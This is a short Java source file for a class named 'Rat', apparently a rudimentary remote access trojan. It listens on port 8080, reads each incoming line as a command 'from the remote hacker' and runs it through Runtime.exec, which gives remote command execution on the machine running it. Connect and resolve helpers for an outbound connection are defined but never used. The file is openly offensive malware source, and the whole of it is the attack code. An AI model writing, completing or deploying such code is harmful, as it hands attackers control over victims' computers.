import java.io.*;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Rat {
    private static Socket s;
    private static Scanner scanner;
    private static PrintWriter printWriter;
    private static int len;
    private static ProcessBuilder pb;
    private static BufferedReader br;
    private static String line;
    private static String stdout;


    private static void executeCommands(String commandAndArgs) throws IOException, InterruptedException {
        String command = commandAndArgs;
        Process proc = Runtime.getRuntime().exec(command);

        // read output
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

        String line = "";
        while ((line = reader.readLine()) != null) System.out.print(line + "\n");
        proc.waitFor();
    }
    private static String resolve(String host) {
        InetAddress ip;
        while (true) {
            try {
                ip = InetAddress.getByName(host);
                host = ip.getHostAddress().toString();
                return host;
            } catch (Exception err) {
                continue;
            }
        }
    }

    private static int connect(String ip, int port)
    {
        try
        {
            s = new Socket(ip, port);
            return 1;
        }
        catch (Exception err)
        {
            return 0;
        }
    }

    public static Socket socket;
    public static void main(String[] args) throws IOException, InterruptedException {
        int port = 8080;
        String answer; String returnedMessage; String reply;
        ServerSocket server = new ServerSocket(port);
        System.out.println("server start at port " + port);


        while(true) {
            socket = server.accept();
            InputStream is = socket.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            answer = br.readLine();
            System.out.println("sent command from the remote hacker: " + answer);


            if ("QUIT".equals(answer))
                break;
            else {
                executeCommands(answer);
            }
        }

    }

}
